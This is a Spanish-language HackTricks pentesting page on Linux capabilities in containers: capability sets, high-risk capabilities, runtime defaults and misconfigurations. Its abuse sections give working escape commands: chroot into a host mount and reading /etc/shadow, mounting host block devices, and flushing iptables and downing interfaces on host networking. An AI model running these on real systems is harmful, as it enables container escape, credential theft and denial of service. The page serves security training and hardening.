# Capacidades de Linux en contenedores

{{#include ../../../../banners/hacktricks-training.md}}

## Resumen

Las capacidades de Linux son una de las piezas más importantes de la seguridad de contenedores porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un contenedor?** En un sistema Linux normal, el UID 0 históricamente implicaba un conjunto de privilegios muy amplio. En kernels modernos, ese privilegio se descompone en unidades más pequeñas llamadas capacidades. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si las capacidades relevantes han sido eliminadas.

Los contenedores dependen en gran medida de esta distinción. Muchas cargas de trabajo aún se lanzan como UID 0 dentro del contenedor por razones de compatibilidad o simplicidad. Sin la eliminación de capacidades ("capability dropping"), eso sería demasiado peligroso. Con la eliminación de capacidades, un proceso root en un contenedor aún puede realizar muchas tareas ordinarias dentro del contenedor mientras se le niegan operaciones de kernel más sensibles. Por eso, una shell de contenedor que muestra `uid=0(root)` no significa automáticamente "host root" ni siquiera "privilegio amplio del kernel". Los conjuntos de capacidades deciden cuánto vale realmente esa identidad root.

Para la referencia completa de las capacidades de Linux y muchos ejemplos de abuso, ver:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capacidades se rastrean en varios conjuntos, incluyendo los conjuntos permitted, effective, inheritable, ambient y bounding. Para muchas evaluaciones de contenedores, la semántica exacta del kernel de cada conjunto es menos importante de inmediato que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar con éxito este proceso ahora mismo, y qué ganancias de privilegios futuras siguen siendo posibles?**

La razón por la que esto importa es que muchas técnicas de breakout son en realidad problemas de capacidades disfrazados de problemas de contenedor. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una gran cantidad de funcionalidades del kernel que un proceso root normal de un contenedor no debería tocar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si además comparte el namespace de red del host. Una carga de trabajo con `CAP_SYS_PTRACE` se vuelve mucho más interesante si puede ver procesos del host mediante el uso compartido del namespace de PID del host. En Docker o Podman eso puede aparecer como `--pid=host`; en Kubernetes normalmente aparece como `hostPID: true`.

En otras palabras, el conjunto de capacidades no puede evaluarse de forma aislada. Debe leerse junto con namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capacidades dentro de un contenedor es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con uno al que se le han añadido todas las capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición mínima, prueba a eliminarlo todo y volver a añadir solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a mostrar que un runtime no se limita a alternar un booleano llamado "privileged". Está moldeando la superficie de privilegios real disponible para el proceso.

## Capacidades de alto riesgo

Aunque muchas capacidades pueden importar dependiendo del objetivo, unas pocas son repetidamente relevantes en el análisis de escapes de contenedores.

**`CAP_SYS_ADMIN`** es la que los defensores deberían tratar con más sospecha. A menudo se describe como "el nuevo root" porque desbloquea una enorme cantidad de funcionalidades, incluidas operaciones relacionadas con mount, comportamientos sensibles al namespace y muchas rutas del kernel que nunca deberían exponerse casualmente a contenedores. Si un contenedor tiene `CAP_SYS_ADMIN`, seccomp débil y sin un fuerte confinamiento MAC, muchas rutas clásicas de escape se vuelven mucho más realistas.

**`CAP_SYS_PTRACE`** importa cuando existe visibilidad de procesos, especialmente si el PID namespace se comparte con el host o con cargas de trabajo vecinas interesantes. Puede convertir visibilidad en manipulación.

**`CAP_NET_ADMIN`** y **`CAP_NET_RAW`** importan en entornos centrados en la red. En una red bridge aislada ya pueden ser riesgosas; en un namespace de red del host compartido son mucho peores porque la carga de trabajo puede reconfigurar la red del host, sniff, spoof o interferir con los flujos de tráfico locales.

**`CAP_SYS_MODULE`** suele ser catastrófica en un entorno con privilegios de root porque cargar módulos del kernel es, efectivamente, control sobre el kernel del host. Casi nunca debería aparecer en una carga de trabajo de contenedor de uso general.

## Uso en runtime

Docker, Podman, stacks basados en containerd y CRI-O usan controles de capacidades, pero los valores por defecto y las interfaces de gestión difieren. Docker los expone muy directamente a través de flags como `--cap-drop` y `--cap-add`. Podman expone controles similares y con frecuencia se beneficia de la ejecución rootless como una capa adicional de seguridad. Kubernetes muestra adiciones y eliminaciones de capacidades a través del `securityContext` del Pod o contenedor. Entornos de system-container como LXC/Incus también dependen del control de capacidades, pero la integración más amplia con el host de esos sistemas a menudo tienta a los operadores a relajar los valores por defecto más agresivamente de lo que lo harían en un entorno de contenedor de aplicaciones.

El mismo principio se mantiene en todos ellos: una capacidad que es técnicamente posible conceder no es necesariamente una que deba concederse. Muchos incidentes del mundo real comienzan cuando un operador añade una capacidad simplemente porque una carga de trabajo falló bajo una configuración más estricta y el equipo necesitó una solución rápida.

## Misconfiguraciones

El error más obvio es `--cap-add=ALL` en CLIs al estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es conceder una o dos capacidades extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione" sin entender también las implicaciones sobre namespace, seccomp y mount. Otro modo de fallo común es combinar capacidades extra con el compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes la exposición equivalente suele aparecer mediante configuraciones de la carga de trabajo como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia lo que la capacidad puede afectar realmente.

También es común ver a administradores creer que, porque una carga de trabajo no está totalmente `--privileged`, aún está significativamente restringida. A veces eso es cierto, pero otras veces la postura efectiva ya está lo suficientemente cerca de privileged como para que la distinción deje de importar operativamente.

## Abuso

El primer paso práctico es enumerar el conjunto efectivo de capacidades y probar inmediatamente las acciones específicas de cada capacidad que importarían para un escape o el acceso a información del host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` está presente, prueba primero mount-based abuse y host filesystem access, porque esto es uno de los breakout enablers más comunes:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` está presente y el contenedor puede ver procesos interesantes, verifica si la capacidad puede convertirse en inspección de procesos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` o `CAP_NET_RAW` está presente, prueba si la carga de trabajo puede manipular la pila de red visible o, al menos, recopilar inteligencia de red útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Cuando una prueba de capability tiene éxito, combínala con la situación de namespace. Una capability que parece meramente arriesgada en un namespace aislado puede convertirse inmediatamente en un primitive de escape o host-recon cuando el contenedor también comparte host PID, host network o host mounts.

### Ejemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si el contenedor tiene `CAP_SYS_ADMIN` y un bind mount escribible del filesystem del host, como `/host`, el escape path suele ser directo:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` tiene éxito, los comandos ahora se ejecutan en el contexto del sistema de archivos raíz del host:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` no está disponible, a menudo se puede lograr el mismo resultado llamando al binario a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Ejemplo completo: `CAP_SYS_ADMIN` + Device Access

Si se expone un dispositivo de bloque del host, `CAP_SYS_ADMIN` puede convertirlo en acceso directo al sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Ejemplo completo: `CAP_NET_ADMIN` + Host Networking

Esta combinación no siempre produce host root directamente, pero puede reconfigurar por completo la pila de red del host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Eso puede permitir denial of service, intercepción de tráfico o acceso a servicios que anteriormente estaban filtrados.

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es solo volcar valores en bruto, sino entender si el proceso tiene suficientes privilegios como para convertir su namespace y su situación de mount actuales en algo peligroso.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Lo interesante aquí:

- `capsh --print` es la forma más fácil de detectar capacidades de alto riesgo como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` te indica lo que está realmente efectivo ahora, no solo lo que podría estar disponible en otros conjuntos.
- Un volcado de capacidades se vuelve mucho más importante si el contenedor también comparte los namespaces de PID, red o usuario del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información cruda de capacidades, el siguiente paso es la interpretación. Pregúntate si el proceso es root, si los namespaces de usuario están activos, si los namespaces del host están compartidos, si seccomp está en modo enforcing, y si AppArmor o SELinux aún restringen el proceso. Un conjunto de capacidades por sí solo es solo parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Valores predeterminados en tiempo de ejecución

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capacidades reducido por defecto | Docker mantiene una allowlist predeterminada de capacidades y elimina el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capacidades reducido por defecto | Los contenedores de Podman no son privilegiados por defecto y usan un modelo de capacidades reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los predeterminados del runtime a menos que se cambien | Si no se especifican `securityContext.capabilities`, el contenedor recibe el conjunto de capacidades predeterminado del runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Normalmente predeterminado por el runtime | El conjunto efectivo depende del runtime más la especificación del Pod | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Para Kubernetes, el punto importante es que la API no define un único conjunto de capacidades predeterminado universal. Si el Pod no añade ni elimina capacidades, la carga de trabajo hereda el predeterminado del runtime para ese nodo.
